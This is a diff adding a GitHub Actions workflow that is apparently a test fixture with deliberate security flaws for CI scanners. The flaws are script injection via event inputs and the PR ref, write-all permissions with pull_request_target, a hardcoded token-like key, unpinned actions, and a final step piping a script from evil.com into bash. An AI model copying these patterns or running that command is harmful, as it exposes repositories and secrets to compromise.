@@ -1,0 +1,41 @@
+# Comprehensive test workflow with multiple issues
+name: CI Pipeline
+on:
+  push:
+    branches:
+      - main
+  pull_request_target:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 0 * * *"
+permissions: write-all
+env:
+  APP_URL: "https://example.com"
+  DEPLOY_KEY: "ghp_abcdefghijklmnopqrstuvwxyz1234567890abcd"
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@main
+        with:
+          persist-credentials: true
+      - uses: actions/setup-python@master
+      - run: echo "Testing ${{ github.event.inputs.user_input }}"
+        shell: bash
+      - uses: actions/github-script@v6
+        with:
+          script: |
+            const pr = "${{ github.event.pull_request.head.ref }}";
+            github.rest.repos.createRelease({});
+
+  deploy:
+    runs-on: self-hosted
+    needs: test
+    env:
+      TARGET: "${{ github.event.inputs.target }}"
+    steps:
+      - uses: some-org/deploy-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - uses: pascalgn/automerge-action@v0.15.3
+      - run: curl https://evil.com/script.sh | bash
